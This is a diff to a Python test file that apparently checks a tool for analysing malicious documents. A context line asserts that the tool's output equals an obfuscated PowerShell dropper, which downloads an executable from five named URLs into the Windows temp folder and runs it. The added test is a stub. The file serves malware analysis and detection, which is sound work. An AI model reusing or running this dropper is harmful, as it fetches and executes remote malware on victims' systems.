@@ -275,3 +275,12 @@ def test_ceb007931bb5b6219960d813008c28421b7b7abfcc05d0813df212ddcfa5b64f(path):
 	t=maldoc(path+'ceb007931bb5b6219960d813008c28421b7b7abfcc05d0813df212ddcfa5b64f')
 	r=t.run()
 	assert r[0][3][1] == """powershell $upn0rxUQ9 = \'$A79ly2i = new-obj0-9288027360ect -com0-9288027360obj0-9288027360ect wsc0-9288027360ript.she0-9288027360ll;$hC0u5Lk = new-object sys0-9288027360tem.net.web0-9288027360client;$eeVnNb = new-object random;$ME8h0Y = \\"0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://bignorthbarbell.com/yuf2G22rSI3c0s,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://mail.dentaladvance.pt/iyRttLHb,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://3d.tdselectronics.com/IWZfq9gD,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://greenflagtrails.co.za/HOHvd9NFU_BaZ62,0-9288027360h0-9288027360t0-9288027360t0-9288027360p0-9288027360://kuoying.net/wp-admin/NcdixzAUZNsxHs0_8DoIcKe\\".spl0-9288027360it(\\",\\");$AmPFqKf = $eeVnNb.nex0-9288027360t(1, 65536);$V2sUJ = \\"c:\\win0-9288027360dows\\tem0-9288027360p\\24.ex0-9288027360e\\";for0-9288027360each($Y92Bsgj in $ME8h0Y){try{$hC0u5Lk.dow0-9288027360nlo0-9288027360adf0-9288027360ile($Y92Bsgj.ToS0-9288027360tring(), $V2sUJ);sta0-9288027360rt-pro0-9288027360cess $V2sUJ;break;}catch{}}\'.replace(\'0-9288027360\', $NRYM8nmxZ);$c4xw1H = \'\';iex($upn0rxUQ9);"""
+
+@pytest.mark.xfail('unhandled')
+@pytest.mark.slow
+@pytest.mark.slowest
+def test_f6de41b01aa340613e87bbd93e4c2c061b4c37b7fc10fa7bf2b7d94c63748145(path):
+	''' ? '''
+	t=maldoc(path+'f6de41b01aa340613e87bbd93e4c2c061b4c37b7fc10fa7bf2b7d94c63748145')
+	r=t.run()
+	assert r[0][1][1] == 'welp'
